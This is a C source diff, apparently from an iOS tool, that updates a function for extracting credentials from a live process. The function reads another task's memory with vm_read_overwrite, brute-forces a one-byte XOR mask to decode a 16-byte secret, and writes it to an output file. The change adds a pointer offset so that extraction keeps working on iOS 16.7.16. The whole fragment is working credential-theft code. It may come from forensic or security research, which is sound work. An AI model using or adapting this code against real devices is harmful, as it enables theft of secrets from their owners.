@@ -1039,28 +1039,32 @@ static int live_credential_callback(mach_port_t task, uint64_t argument, void *o
         return 0;
     }
 
-    uint64_t parent = 0;
-    uint8_t encoded[16] = {0};
     vm_size_t read_size = 0;
-    if (vm_read_overwrite(task, (vm_address_t)argument, sizeof(parent), (vm_address_t)(uintptr_t)&parent, &read_size) == KERN_SUCCESS && read_size == sizeof(parent) && parent && vm_read_overwrite(task, (vm_address_t)parent, sizeof(encoded), (vm_address_t)(uintptr_t)encoded, &read_size) == KERN_SUCCESS && read_size == sizeof(encoded)) {
-        uint8_t credential[16] = {0};
-        for (unsigned mask = 0; mask < 256; mask++) {
-            for (size_t i = 0; i < sizeof(credential); i++) {
-                credential[i] = encoded[i] ^ (uint8_t)mask;
+    /* iOS 16.7.16 uses +0x10; retain the first-pointer path for older builds. */
+    for (size_t pointer_offset = 0; pointer_offset <= 0x10; pointer_offset += 0x10) {
+        uint64_t parent = 0;
+        uint8_t encoded[16] = {0};
+        if (vm_read_overwrite(task, (vm_address_t)(argument + pointer_offset), sizeof(parent), (vm_address_t)(uintptr_t)&parent, &read_size) == KERN_SUCCESS && read_size == sizeof(parent) && parent && vm_read_overwrite(task, (vm_address_t)parent, sizeof(encoded), (vm_address_t)(uintptr_t)encoded, &read_size) == KERN_SUCCESS && read_size == sizeof(encoded)) {
+            uint8_t credential[16] = {0};
+            for (unsigned mask = 0; mask < 256; mask++) {
+                for (size_t i = 0; i < sizeof(credential); i++) {
+                    credential[i] = encoded[i] ^ (uint8_t)mask;
+                }
+
+                if (live_credential_matches(credential, live)) {
+                    int result = write_new(live->output, credential, sizeof(credential)) ? -1 : 1;
+                    memset(credential, 0, sizeof(credential));
+                    memset(encoded, 0, sizeof(encoded));
+                    return result;
+                }
             }
 
-            if (live_credential_matches(credential, live)) {
-                int result = write_new(live->output, credential, sizeof(credential)) ? -1 : 1;
-                memset(credential, 0, sizeof(credential));
-                memset(encoded, 0, sizeof(encoded));
-                return result;
-            }
+            memset(credential, 0, sizeof(credential));
         }
 
-        memset(credential, 0, sizeof(credential));
+        memset(encoded, 0, sizeof(encoded));
     }
 
-    memset(encoded, 0, sizeof(encoded));
     for (size_t offset = 0; offset < 0x100; offset += sizeof(uint64_t)) {
         uint64_t pointer = 0;
         read_size = 0;
